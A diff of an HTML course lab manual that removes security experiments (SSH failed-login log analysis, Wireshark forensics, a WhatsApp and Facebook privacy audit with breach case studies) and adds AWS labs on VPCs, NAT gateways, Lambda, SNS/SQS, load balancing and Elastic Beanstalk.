-<span class="cm"># Wrong password -&gt; Enter -&gt; Ctrl+C -&gt; repeat 5-10 times</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 5 &mdash; Detect Failed Login Attempts</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>journalctl | grep "Failed password"
-<span class="cm"># Shows each failed attempt with timestamp and IP</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 6 &mdash; Extract &amp; Count IPs (Key Command)</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal &mdash; MOST IMPORTANT</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr
-<span class="cm"># Output: 10 127.0.0.1  &lt;-- brute force detected!</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 7 &mdash; Additional Useful Commands</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>journalctl | grep ssh             <span class="cm"># SSH activity</span>
-journalctl | grep -i error        <span class="cm"># system errors</span>
-sudo journalctl -f                <span class="cm"># real-time monitoring</span>
-journalctl --since "10 minutes ago"
-grep "404" /var/log/apache2/access.log   <span class="cm"># web scan attempts</span>
-less /var/log/dpkg.log            <span class="cm"># package installs</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Result</div>
-        <div class="conclusion">
-          <p class="conclusion-text">Log files were analyzed using <code>journalctl</code>, <code>grep</code>, <code>awk</code>, <code>sort</code>, and <code>uniq</code>. 10 failed SSH attempts from 127.0.0.1 were identified as a brute force attack. Real-time monitoring performed using <code>journalctl -f</code>.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- EXP 12 -->
-  <div class="experiment" id="exp12" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number">12</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">Network Forensics Using Wireshark</div>
-        <div class="exp-subtitle">Kali Linux &middot; Wireshark &middot; ping &middot; curl &middot; nslookup &middot; Filters</div>
-      </div>
-      <div class="exp-toggle">&#9662;</div>
-    </div>
-    <div class="exp-body">
-      <div class="section">
-        <div class="section-label">Aim</div>
-        <p>Capture and analyze network packets using Wireshark &mdash; applying filters, following TCP streams, and examining protocol layers for network forensics.</p>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 1 &mdash; Fix Permissions (Once)</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal &mdash; only if permission error</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>sudo dpkg-reconfigure wireshark-common
-<span class="cm"># Select YES for non-superusers</span>
-sudo usermod -a -G wireshark $USER
-newgrp wireshark</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 2 &mdash; Launch Wireshark &amp; Start Capture</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>wireshark &amp;
-<span class="cm"># Double-click: wlp3s0 (Wi-Fi) or eth0 (wired)</span>
-<span class="cm"># Packets start scrolling</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 3 &mdash; Generate Network Traffic</div>
-        <div class="cb-wrap"><span class="cb-label">New Terminal while Wireshark captures</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>ping google.com -c 5    <span class="cm"># ICMP traffic</span>
-curl http://example.com  <span class="cm"># HTTP traffic</span>
-nslookup google.com      <span class="cm"># DNS traffic</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 4 &mdash; Apply Filters (Filter Bar -&gt; Enter)</div>
-        <div class="cb-wrap"><span class="cb-label">Wireshark Filter Bar</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>tcp                       <span class="cm"># TCP only</span>
-udp                       <span class="cm"># UDP only</span>
-http                      <span class="cm"># HTTP only</span>
-dns                       <span class="cm"># DNS only</span>
-ip.addr == 192.168.0.105  <span class="cm"># your IP (get it: ip a)</span>
-ip.src == 192.168.0.105   <span class="cm"># source IP filter</span>
-tcp.port == 80            <span class="cm"># port 80 only</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 5 &mdash; Analyze Packet Layers</div>
-        <div class="code-block"><pre><span class="cm"># Click packet -&gt; expand in middle panel:</span>
-Frame              -&gt; timestamp, capture info
-Ethernet II        -&gt; MAC addresses (src &amp; dst)
-Internet Protocol  -&gt; IP addresses (src &amp; dst)
-TCP                -&gt; port numbers, SYN/ACK flags
-HTTP               -&gt; GET/POST, URL, response code</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 6 &mdash; Follow TCP Stream</div>
-        <div class="code-block"><pre>Right-click HTTP packet -&gt; Follow -&gt; TCP Stream
-<span class="cm"># Shows full conversation: GET / HTTP/1.1 ... 200 OK</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 7 &mdash; Statistics &amp; Save</div>
-        <div class="code-block"><pre>Menu -&gt; Statistics -&gt; Protocol Hierarchy
-<span class="cm"># Shows % TCP, % UDP, % HTTP etc.</span>
-
-<span class="cm"># Stop capture: Red Square button</span>
-File -&gt; Save As -&gt; capture.pcap -&gt; Save
-File -&gt; Export Objects -&gt; HTTP</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Result</div>
-        <div class="conclusion">
-          <p class="conclusion-text">Network packets captured on wlp3s0. Filters isolated TCP, HTTP, DNS traffic. TCP stream followed to read HTTP conversations. Protocol hierarchy showed protocol distribution &mdash; complete network forensics workflow demonstrated.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- EXP 13 -->
-  <div class="experiment" id="exp13" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number">13</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">Privacy Audit &mdash; WhatsApp &amp; Facebook + Data Breach Analysis</div>
-        <div class="exp-subtitle">Nativefier &middot; Wireshark &middot; Burp Suite &middot; Exodus Privacy &middot; HaveIBeenPwned</div>
-      </div>
-      <div class="exp-toggle">&#9662;</div>
-    </div>
-    <div class="exp-body">
-      <div class="section">
-        <div class="section-label">Aim</div>
-        <p>Analyze privacy and network behavior of WhatsApp and Facebook using Kali Linux tools, and perform data breach case study analysis using real-world incidents.</p>
-      </div>
-      <div class="section">
-        <div class="section-label">Setup &mdash; Install WhatsApp Desktop via Nativefier</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>sudo apt update
-sudo apt install nodejs npm -y
-
-sudo npm install -g nativefier
-
-nativefier https://web.whatsapp.com
-<span class="cm"># Creates folder: WhatsAppWeb-linux-x64</span>
-
-cd WhatsAppWeb-linux-x64
-./WhatsAppWeb
-<span class="cm"># QR code -&gt; phone: WhatsApp -&gt; Linked Devices -&gt; Link a Device</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Part 1 &mdash; WhatsApp Privacy Audit</div>
+        <div class="label">Step 2 &mdash; Create and Configure Route Tables</div>
         <ul class="steps">
-          <li class="step"><span class="step-num">1a</span><span class="step-text">Open Firefox &rarr; <code>https://reports.exodus-privacy.eu.org</code> &rarr; search: WhatsApp &rarr; record trackers (Google Analytics, Crashlytics, Facebook Analytics)</span></li>
+          <li class="step"><span class="step-n">01</span><span class="step-text">Go to <strong>Route Tables &rarr; Create route table</strong>. Select the VPC. Name it <code>public-route</code>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Create another route table named <code>private-route</code> in the same VPC.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Select <code>public-route</code> &rarr; <strong>Actions &rarr; Edit routes &rarr; Add route</strong>. Destination: <code>0.0.0.0/0</code>, Target: <strong>Internet Gateway</strong>. Select the gateway &rarr; <strong>Save changes</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Go to <strong>Subnets &rarr; Public Subnet &rarr; Edit subnet settings</strong>. Enable <strong>Auto-assign public IPv4 address</strong>.</span></li>
+          <li class="step"><span class="step-n">05</span><span class="step-text">Select <code>public-route</code> &rarr; <strong>Edit subnet associations</strong>. Select the public subnet &rarr; <strong>Save associations</strong>. Repeat for private route and private subnet.</span></li>
         </ul>
-        <div class="cb-wrap" style="margin-top:12px"><span class="cb-label">1b &mdash; Capture WhatsApp Traffic</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>wireshark &amp;
-<span class="cm"># Select eth0 or wlp3s0 -&gt; Start Capture</span>
-<span class="cm"># In WhatsApp Desktop: send messages, images, open chats</span>
+      </div>
 
-<span class="cm"># Apply filters:</span>
-tls    <span class="cm"># encrypted traffic</span>
-dns    <span class="cm"># domain lookups</span></pre></div>
-        <div class="output-block">
-          <div class="output-line">&#10003; All traffic TLS encrypted &mdash; message content NOT visible</div>
-          <div class="output-line">&#10003; Domains: whatsapp.net, facebook.com</div>
-          <div class="output-line inp">&#9888; Metadata visible: IP, time, server communication</div>
+      <div class="section">
+        <div class="label">Step 3 &mdash; Create Security Group and Launch Instances</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Create a <strong>Security Group</strong> with inbound rules: <strong>SSH (22)</strong>, <strong>HTTP (80)</strong>, and <strong>HTTPS (443)</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Launch an EC2 instance (Ubuntu). In network settings: select the VPC, select the <strong>public subnet</strong>, and enable public IP. Use the created security group.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Launch a second EC2 instance (Ubuntu) in the <strong>private subnet</strong> with no public IP (for internal use only).</span></li>
+        </ul>
+        <div class="output">
+          <div class="output-line">Public instance: reachable from the internet via public IP</div>
+          <div class="output-line">Private instance: not reachable directly from internet</div>
         </div>
       </div>
-      <div class="section">
-        <div class="section-label">Part 2 &mdash; Facebook Privacy Audit via Burp Suite</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>burpsuite
 
-<span class="cm"># Configure Firefox proxy:</span>
-Settings -&gt; Network Settings -&gt; Manual Proxy
-HTTP Proxy: 127.0.0.1   Port: 8080 -&gt; OK
-
-<span class="cm"># Open: https://www.facebook.com -&gt; login</span>
-
-<span class="cm"># Burp: Proxy -&gt; Intercept -&gt; Intercept ON</span>
-<span class="cm"># Reload Facebook -&gt; look for cookies: datr, fr, session IDs</span>
-
-<span class="cm"># Browser F12 -&gt; Network tab -&gt; look for:</span>
-<span class="cm"># analytics.facebook.com, connect.facebook.net, pixel tracking URLs</span></pre></div>
-      </div>
       <div class="section">
-        <div class="section-label">Part 3 &mdash; Data Breach Case Studies</div>
-        <div class="qa-item">
-          <span class="qa-q">Case 1</span>
-          <span class="qa-a"><strong>Facebook Data Breach (2021)</strong><br>Users: 533 million &bull; Data: Phone numbers, emails, names<br>Cause: API vulnerability &mdash; scraping via contact import feature<br>Prevention: Rate limiting, API security, input validation</span>
-        </div>
-        <div class="qa-item">
-          <span class="qa-q">Case 2</span>
-          <span class="qa-a"><strong>WhatsApp Pegasus Spyware (2019)</strong><br>Method: Zero-click exploit via missed call (no user interaction)<br>Impact: Full device access &mdash; camera, mic, messages<br>Cause: Buffer overflow in VoIP stack<br>Prevention: Immediate patching, OS updates, zero-day monitoring</span>
-        </div>
-        <div class="cb-wrap" style="margin-top:16px"><span class="cb-label">Check Email Breach Status</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>https://haveibeenpwned.com
-<span class="cm"># Enter any email -&gt; check known data breaches</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Analysis Points (Write in Record)</div>
-        <div class="code-block"><pre>1. Type of Attack:  API abuse / Zero-click spyware
-2. Vulnerability:   API flaw / Buffer overflow in VoIP
-3. Data Exposed:    phone, email / messages, device access
-4. Prevention:      rate limiting / patching, monitoring</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Result</div>
+        <div class="label">Conclusion</div>
         <div class="conclusion">
-          <p class="conclusion-text">Privacy audit completed. WhatsApp: all traffic TLS-encrypted, metadata (IP, timing) visible but message content hidden. Facebook: extensive tracking via cookies (<code>datr</code>, <code>fr</code>), third-party scripts intercepted in Burp Suite. Data breach analysis highlighted critical risks of API vulnerabilities and zero-day exploits.</p>
+          <p>A custom VPC was created with both public and private subnets. Route tables were configured to connect the public subnet to the Internet Gateway. EC2 instances were launched in appropriate subnets with security group rules enforcing access control.</p>
         </div>
       </div>
+
     </div>
   </div>
 
+  <!-- WEEK 6 -->
+  <div class="week" id="w6" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W06</div>
+      <div class="week-title-wrap">
+        <div class="week-title">VPC with NAT Gateway &mdash; Private Instance Internet Access</div>
+        <div class="week-sub">NAT Gateway &middot; Jump Server &middot; Private Subnet &middot; Internet Routing</div>
+      </div>
+      <div class="week-arrow">&#9662;</div>
+    </div>
+    <div class="week-body">
+
+      <div class="section">
+        <div class="label">Objective</div>
+        <p>Configure a NAT Gateway to allow a private subnet EC2 instance to access the internet without being publicly reachable. Use a Jump Server to access the private instance.</p>
+      </div>
+
+      <div class="section">
+        <div class="label">Architecture Setup</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Create VPC <code>my-vpc</code> with a public and private subnet. Create two route tables and an Internet Gateway. Connect the public route table to the Internet Gateway.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Launch instance <strong>web-app</strong> (Ubuntu) in the <strong>public subnet</strong>. Allow SSH, HTTP, and HTTPS in its security group.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Launch instance <strong>db-server</strong> (Ubuntu) in the <strong>private subnet</strong>. Disable public IP. Allow SSH only. This instance has no direct internet access.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Launch instance <strong>jump-server</strong> (Ubuntu) in the <strong>public subnet</strong>. This acts as the relay to access the private instance.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Verify No Internet on Private Instance</div>
+        <div class="code-header"><span class="code-label">SSH via Jump Server &mdash; db-server</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cm"># SSH into jump-server first, then into db-server</span>
+<span class="cm"># Test internet from db-server (will fail without NAT)</span>
+<span class="cmd">ping google.com</span>
+<span class="cm"># Result: Network unreachable</span></pre></div>
+      </div>
+
+      <div class="section">
+        <div class="label">Create NAT Gateway and Update Route</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">05</span><span class="step-text">Go to <strong>VPC &rarr; NAT Gateways &rarr; Create NAT Gateway</strong>. Provide a name. Select the <strong>public subnet</strong> and allocate an Elastic IP. Click <strong>Create</strong>.</span></li>
+          <li class="step"><span class="step-n">06</span><span class="step-text">Go to the <strong>private route table &rarr; Edit routes &rarr; Add route</strong>. Destination: <code>0.0.0.0/0</code>, Target: select the NAT Gateway. Save changes.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Verify Internet Access on Private Instance</div>
+        <div class="code-header"><span class="code-label">SSH via Jump Server &mdash; db-server</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cmd">ping google.com</span>
+<span class="cm"># Result: replies received (internet now reachable via NAT Gateway)</span></pre></div>
+        <div class="output">
+          <div class="output-line">Private instance has outbound internet access via NAT Gateway</div>
+          <div class="output-line note">Inbound connections from the internet are still blocked (private IP only)</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Conclusion</div>
+        <div class="conclusion">
+          <p>A NAT Gateway was deployed in the public subnet and the private route table was updated to route internet-bound traffic through it. The private db-server now has outbound internet access while remaining inaccessible from the internet directly.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- WEEK 7 -->
+  <div class="week" id="w7" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W07</div>
+      <div class="week-title-wrap">
+        <div class="week-title">Lambda Triggered by S3 Upload &rarr; DynamoDB Logging</div>
+        <div class="week-sub">AWS Lambda &middot; S3 Trigger &middot; DynamoDB &middot; CloudWatch Logs</div>
+      </div>
+      <div class="week-arrow">&#9662;</div>
+    </div>
+    <div class="week-body">
+
+      <div class="section">
+        <div class="label">Objective</div>
+        <p>Create a Lambda function that is automatically triggered when an object is uploaded to an S3 bucket, and stores the object metadata into a DynamoDB table.</p>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 1 &mdash; Create Lambda Function</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Search for <strong>Lambda</strong> in the AWS Console &rarr; click <strong>Create function</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Choose <strong>Author from scratch</strong>. Enter function name: <code>lambda-function</code>. Select runtime: <strong>Python 3.10</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Under <strong>Permissions</strong>, choose <strong>Use an existing role</strong>. Select <code>LabRole</code> (which has permissions for S3 and DynamoDB). Click <strong>Create function</strong>.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 2 &mdash; Test the Function</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">In the Lambda console, go to the <strong>Test</strong> tab &rarr; <strong>Create new event</strong>. Select template: <strong>S3 Put</strong>. Update the bucket name in the event JSON to match your S3 bucket.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Click <strong>Save</strong> &rarr; click <strong>Test</strong>. The function should execute successfully.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 3 &mdash; Add S3 Trigger</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">In the Lambda console, click <strong>Add trigger</strong>. Select source: <strong>S3</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Select your bucket (must be in the same region as Lambda). Check the acknowledgement checkbox. Click <strong>Save</strong>.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 4 &mdash; Trigger and Verify</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Go to your S3 bucket &rarr; <strong>Upload</strong> any document &rarr; click <strong>Upload</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Go to <strong>DynamoDB &rarr; Explore items</strong>. Select the table. Under <strong>Items returned</strong>, the uploaded object metadata is now visible.</span></li>
+        </ul>
+        <div class="output">
+          <div class="output-line">Object metadata stored in DynamoDB after S3 upload event</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 5 &mdash; View CloudWatch Logs</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">In the Lambda console &rarr; <strong>Monitor</strong> tab &rarr; click <strong>View CloudWatch logs</strong>. Select a log stream to see execution details and print outputs.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Conclusion</div>
+        <div class="conclusion">
+          <p>A serverless workflow was implemented: S3 upload triggers Lambda, which stores object metadata to DynamoDB. CloudWatch Logs verified execution. This is the standard event-driven architecture pattern in AWS serverless applications.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- WEEK 8 -->
+  <div class="week" id="w8" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W08</div>
+      <div class="week-title-wrap">
+        <div class="week-title">SNS, SQS and S3 &rarr; SNS &rarr; SQS &rarr; Lambda Pipeline</div>
+        <div class="week-sub">SNS &middot; SQS &middot; Lambda &middot; S3 Event Notification &middot; Email</div>
+      </div>
+      <div class="week-arrow">&#9662;</div>
+    </div>
+    <div class="week-body">
+
+      <div class="section">
+        <div class="label">Objective</div>
+        <p>Set up SNS for email notifications and SQS for message queuing, then build an end-to-end pipeline: S3 upload event triggers SNS, which fans out to SQS, which can trigger Lambda for processing.</p>
+      </div>
+
+      <div class="section">
+        <div class="label">Part A &mdash; SNS Topic and Email Subscription</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Search for <strong>SNS</strong> in the AWS Console &rarr; <strong>Topics &rarr; Create topic</strong>. Type: <strong>Standard</strong>. Name: <code>MyEmailTopic</code>. Click <strong>Create topic</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Open the topic &rarr; <strong>Subscriptions &rarr; Create subscription</strong>. Protocol: <strong>Email</strong>. Endpoint: your email address. Click <strong>Create subscription</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Check your email inbox for a confirmation email from Amazon SNS. Click <strong>Confirm subscription</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Go to the S3 bucket &rarr; <strong>Properties &rarr; Event notifications &rarr; Create event notification</strong>. Set destination to <strong>SNS topic</strong>, choose your topic. Click <strong>Save</strong>. Upload a file to trigger the notification email.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Part B &mdash; SQS Queue and Message Test</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Search for <strong>SQS</strong> &rarr; <strong>Create queue</strong>. Type: <strong>Standard</strong>. Name: <code>MyQueue</code>. Leave defaults &rarr; <strong>Create queue</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Open <code>MyQueue</code> &rarr; <strong>Send and receive messages</strong>. In <strong>Message body</strong>, enter a test message &rarr; click <strong>Send message</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">On the same page, click <strong>Poll for messages</strong>. The sent message appears in the list.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Part C &mdash; S3 &rarr; SNS &rarr; SQS &rarr; Lambda Pipeline</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Create an S3 bucket named <code>s3-sns-sqs-lambda</code>. Create an SNS Standard topic named <code>MyS3SNSTopic</code>. Copy the <strong>SNS Topic ARN</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Create an SQS Standard queue named <code>MyS3Queue</code>. Copy the <strong>Queue ARN</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Open <code>MyS3SNSTopic</code> &rarr; <strong>Create subscription</strong>. Protocol: <strong>Amazon SQS</strong>. Endpoint: select <code>MyS3Queue</code>. Click <strong>Create subscription</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Open <code>MyS3Queue &rarr; Access Policy &rarr; Edit</strong>. Update the policy JSON with the SQS ARN and SNS ARN to allow SNS to send messages to the queue.</span></li>
+          <li class="step"><span class="step-n">05</span><span class="step-text">Open the SNS Topic &rarr; <strong>Edit access policy</strong>. Replace the SNS topic ARN, S3 bucket ARN, and Account ID in the policy to allow S3 to publish to SNS.</span></li>
+          <li class="step"><span class="step-n">06</span><span class="step-text">Configure the S3 bucket event notification to publish to the SNS topic on object uploads. Upload a file to verify the full pipeline triggers correctly.</span></li>
+        </ul>
+        <div class="output">
+          <div class="output-line">S3 upload &rarr; SNS notification &rarr; SQS message delivered &rarr; Lambda processes</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Conclusion</div>
+        <div class="conclusion">
+          <p>SNS and SQS were configured independently and then connected into a full event pipeline. An S3 upload triggers SNS, which delivers to SQS, enabling decoupled, asynchronous event-driven processing with Lambda.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- WEEK 9 -->
+  <div class="week" id="w9" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W09</div>
+      <div class="week-title-wrap">
+        <div class="week-title">Elastic Load Balancer with Auto Scaling</div>
+        <div class="week-sub">ALB &middot; Target Groups &middot; Apache HTTPD &middot; Auto Scaling Groups &middot; AMI</div>
+      </div>
+      <div class="week-arrow">&#9662;</div>
+    </div>
+    <div class="week-body">
+
+      <div class="section">
+        <div class="label">Objective</div>
+        <p>Deploy two EC2 web servers behind an Application Load Balancer, then configure an Auto Scaling Group to automatically maintain instance count and recover from failures.</p>
+      </div>
+
+      <div class="section">
+        <div class="label">Part A &mdash; Launch Web Servers</div>
+        <div class="code-header"><span class="code-label">SSH &mdash; webserver-1</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cmd">sudo yum update -y</span>
+<span class="cmd">sudo yum install httpd -y</span>
+<span class="cmd">systemctl start httpd</span>
+<span class="cmd">systemctl enable httpd</span>
+<span class="cmd">echo "This is Server 1" > /var/www/html/index.html</span></pre></div>
+
+        <div class="code-header"><span class="code-label">SSH &mdash; webserver-2</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cmd">sudo yum update -y</span>
+<span class="cmd">sudo yum install httpd -y</span>
+<span class="cmd">systemctl start httpd</span>
+<span class="cmd">systemctl enable httpd</span>
+<span class="cmd">echo "This is Server 2" > /var/www/html/index.html</span></pre></div>
+        <p>Verify: paste each server's public IP in a browser to confirm the correct page loads.</p>
+      </div>
+
+      <div class="section">
+        <div class="label">Part B &mdash; Create Security Group and Load Balancer</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Create Security Group <code>loadbalancer-sg</code>. Inbound rule: <strong>HTTP (80)</strong> from anywhere. Leave outbound as default.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Go to <strong>EC2 &rarr; Load Balancers &rarr; Create Load Balancer &rarr; Application Load Balancer</strong>. Name: <code>my-loadbalancer</code>. Scheme: <strong>Internet-facing</strong>. Select all subnets. Choose <code>loadbalancer-sg</code>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Create a target group named <code>my-targetgroup</code>. Target type: <strong>Instance</strong>. Protocol: <strong>HTTP</strong>, Port: <strong>80</strong>. Select both web server instances &rarr; <strong>Include as pending</strong> &rarr; <strong>Create target group</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Attach the target group as the listener for the load balancer &rarr; <strong>Create load balancer</strong>.</span></li>
+        </ul>
+        <div class="output">
+          <div class="output-line">Copy DNS name of load balancer &rarr; paste in browser</div>
+          <div class="output-line">Refreshing alternates between "This is Server 1" and "This is Server 2"</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Part C &mdash; Auto Scaling Group</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Select <strong>webserver-1</strong> &rarr; <strong>Actions &rarr; Image and Templates &rarr; Create Image</strong>. Name: <code>my-webserver-AMI</code>. Click <strong>Create Image</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Go to <strong>EC2 &rarr; Launch Templates &rarr; Create Launch Template</strong>. Name: <code>my-template</code>. Select the AMI created above. Instance type: <code>t2.micro</code>. Select your key pair.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Create an <strong>Auto Scaling Group</strong> using the launch template. Desired: <strong>2</strong>, Minimum: <strong>1</strong>, Maximum: <strong>4</strong>. Attach to the existing load balancer and target group. Click <strong>Create Auto Scaling Group</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">To test auto recovery: select and <strong>terminate an instance</strong>. The Auto Scaling Group automatically launches a replacement within the desired capacity range.</span></li>
+        </ul>
+        <div class="output">
+          <div class="output-line">Terminated instance is replaced automatically by Auto Scaling</div>
+          <div class="output-line">Load balancer continues routing traffic to healthy instances</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Conclusion</div>
+        <div class="conclusion">
+          <p>An Application Load Balancer distributed traffic across two Apache web servers. An Auto Scaling Group with a custom AMI was configured to maintain instance count between 1 and 4. Terminating an instance confirmed automatic recovery, demonstrating high availability and fault tolerance.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- WEEK 10 -->
+  <div class="week" id="w10" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W10</div>
+      <div class="week-title-wrap">
+        <div class="week-title">Elastic Beanstalk &mdash; Deploy a Java Web Application</div>
+        <div class="week-sub">Eclipse &middot; Apache Tomcat &middot; WAR File &middot; Elastic Beanstalk</div>
+      </div>
+      <div class="week-arrow">&#9662;</div>
+    </div>
+    <div class="week-body">
+
+      <div class="section">
+        <div class="label">Objective</div>
+        <p>Build and test a Java web application locally in Eclipse, export it as a WAR file, and deploy it to AWS Elastic Beanstalk without manually provisioning any infrastructure.</p>
+      </div>
+
+      <div class="section">
+        <div class="label">Part A &mdash; Create and Run App Locally in Eclipse</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Open <strong>Eclipse</strong> &rarr; <strong>File &rarr; New &rarr; Dynamic Web Project</strong>. Project Name: <code>NotesApp</code>. Target Runtime: <strong>Apache Tomcat</strong>. Click <strong>Finish</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Right-click the project &rarr; <strong>Run As &rarr; Run on Server</strong>. Choose <strong>Apache Tomcat</strong>. Confirm the Notes App runs locally in the browser.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Part B &mdash; Export as WAR File</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Right-click the project &rarr; <strong>Export &rarr; WAR file</strong>. Choose destination folder on your local machine. Click <strong>Finish</strong>.</span></li>
+        </ul>
+      </div>
+
